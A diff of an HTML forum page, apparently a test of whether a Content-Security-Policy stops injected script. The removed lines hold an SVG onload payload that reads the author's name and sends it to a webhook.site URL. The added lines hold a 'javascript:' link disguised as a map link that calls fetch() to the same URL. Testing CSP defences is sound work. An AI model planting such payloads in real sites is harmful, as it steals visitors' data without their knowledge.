@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <title>Secure Forum</title>
-
-  <!-- CSP bloqueando praticamente tudo -->
+  
+  <!-- CSP forte bloqueando inline JS -->
   <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self'; img-src 'self';">
 
   <style>
@@ -31,14 +31,11 @@
     <div class="content">
       Here’s a safe tip: Never trust gelato 🍦 from empty shops!<br><br>
 
-      <!-- Este SVG não é executado no site original por causa da CSP -->
-      <svg onload="
-        const u = document.querySelector('.author')?.innerText;
-        const url = 'https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a?user=' + encodeURIComponent(u);
-        const i = document.createElement('img');
-        i.src = url;
-        document.body.appendChild(i);
-      "></svg>
+      <!-- Este link não faz nada na página original (CSP bloqueia javascript:) -->
+      <a href="javascript:fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a?hit=1')">
+        <!-- aparência inofensiva -->
+        Click here for map 📍
+      </a>
 
       <p>Happy travels!</p>
     </div>
